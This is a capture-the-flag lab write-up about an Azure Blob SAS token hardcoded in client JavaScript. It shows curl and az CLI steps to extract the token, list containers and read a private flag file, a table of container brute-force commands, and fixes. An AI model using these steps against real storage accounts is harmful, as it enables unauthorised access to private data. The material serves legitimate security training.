# Blob SAS Token Exposure

**Difficulty:** Beginner | **Provider:** Azure | **Category:** Storage / Credential Exposure

## Scenario

A developer built an internal employee portal that reads documents from Azure Blob Storage.
To "simplify" the client-side code, they hardcoded a **Shared Access Signature (SAS) token**
directly in `app.js`. The SAS token has **read + list** permissions scoped to the entire
storage account (not just the public web container) and expires in 2030.

The portal's static files are served from a public `$web` container. Any visitor who
inspects the JavaScript source finds the SAS token and can use it to access the private
`secrets` container — including `flag.txt`.

## What is a SAS Token?

A **Shared Access Signature (SAS)** is a URI query string that grants time-limited,
permission-scoped access to Azure Storage without needing account credentials.
It looks like this:

```
?sv=2019-12-12&ss=b&srt=sco&sp=rl&se=2030-01-01T00:00:00Z&st=2024-01-01T00:00:00Z&spr=https&sig=<signature>
```

| Parameter | Meaning | Values in this lab |
|-----------|---------|-------------------|
| `sv` | Storage service version | `2019-12-12` |
| `ss` | Services (which Azure Storage services) | `b` = Blob only |
| `srt` | Resource types accessible | `s` = service, `c` = container, `o` = object |
| `sp` | Permissions | `r` = read, `l` = list |
| `st` | Start time (ISO 8601) | `2024-01-01` |
| `se` | Expiry time (ISO 8601) | `2030-01-01` — far future, a red flag |
| `spr` | Allowed protocol | `https` |
| `sig` | HMAC-SHA256 signature over the parameters | (opaque) |

The `srt=sco` and `sp=rl` combination is particularly dangerous: it grants **read and list
access to every container and every blob** in the storage account — not just the one the
developer intended to share.

### How to use the SAS token

Append it to any Azure Blob Storage URL as a query string:

```
https://<account>.blob.core.windows.net/<container>/<blob>?sv=...&sig=...
```

When the URL already has query parameters (e.g. `?restype=container&comp=list`),
strip the leading `?` from the SAS and join with `&`:

```bash
# List blobs in a container
curl "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list&sv=...&sig=..."

# List all containers in the account (requires srt=s)
curl "https://<account>.blob.core.windows.net/?comp=list&sv=...&sig=..."

# Download a specific blob
curl "https://<account>.blob.core.windows.net/<container>/<blob>?sv=...&sig=..."
```



```
[Attacker]
    |
    v
Browse to web endpoint  -->  view page source  -->  app.js
    |
    v
Extract SAS_TOKEN from JavaScript variable
    |
    v
List private container:
  GET /secrets?restype=container&comp=list&<sas>
    |
    v
Read flag:
  GET /secrets/flag.txt?<sas>
```

### Step 1 — Fetch app.js and extract the SAS token

```bash
curl <app_js_url>
# Look for: const SAS_TOKEN = "?sv=...";
```

Extract the value of `SAS_TOKEN` (the full query string starting with `?sv=`).

### Step 2 — Enumerate containers

The SAS token has service-level list permission — use it to enumerate all containers directly:

```bash
ACCOUNT="<storage_account_name>"
SAS="<extracted_sas_token>"   # starts with ?sv=

curl "https://${ACCOUNT}.blob.core.windows.net/?comp=list&${SAS:1}"
```

If listing were restricted, you would brute-force container names instead.
Common tools and wordlists for Azure Blob Storage container enumeration:

| Tool | Example command |
|------|----------------|
| **gobuster** | `gobuster fuzz -u "https://<account>.blob.core.windows.net/FUZZ?restype=container&comp=list" -w containers.txt -b 404` |
| **ffuf** | `ffuf -u "https://<account>.blob.core.windows.net/FUZZ?restype=container" -w containers.txt -fc 404` |
| **cloudbrute** | `cloudbrute -d <account>.blob.core.windows.net -w containers.txt -service azure` |
| **cloud_enum** | `./cloud_enum.py -k <account> --disable-aws --disable-gcp` |
| **BlobHunter** | `python BlobHunter.py -a <account>` |
| **wfuzz** | `wfuzz -c -z file,containers.txt --hc 404 "https://<account>.blob.core.windows.net/FUZZ?restype=container"` |

Recommended wordlists from [SecLists](https://github.com/danielmiessler/SecLists):
- `Discovery/Cloud/azure-storage-containers.txt`
- `Discovery/Web-Content/common.txt`
- `Discovery/DNS/subdomains-top1million-5000.txt`

### Step 3 — Read the flag

```bash
curl "https://${ACCOUNT}.blob.core.windows.net/secrets/flag.txt${SAS}"

# Or with the CLI:
az storage blob download \
  --account-name <account> \
  --container-name secrets \
  --name flag.txt \
  --sas-token "<sas_token>" \
  --file /dev/stdout
```

## How to Fix in Production

1. **Never embed SAS tokens in client-side code** — tokens in JavaScript are visible to
   anyone who views the page source.
2. **Use a backend proxy**: the server fetches blobs using a managed identity and returns
   only what the authenticated user is authorised to see.
3. **Scope SAS tokens tightly**: generate per-blob, short-lived SAS tokens server-side
   rather than account-level tokens with multi-year expiry.
4. **Use User Delegation SAS** (backed by Entra ID credentials) rather than account key
   SAS — they can be revoked by revoking the user's access.
5. **Enable Defender for Storage** to alert on anomalous SAS token usage patterns.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Cloud Storage Object Discovery | T1619 |
| Data from Cloud Storage | T1530 |
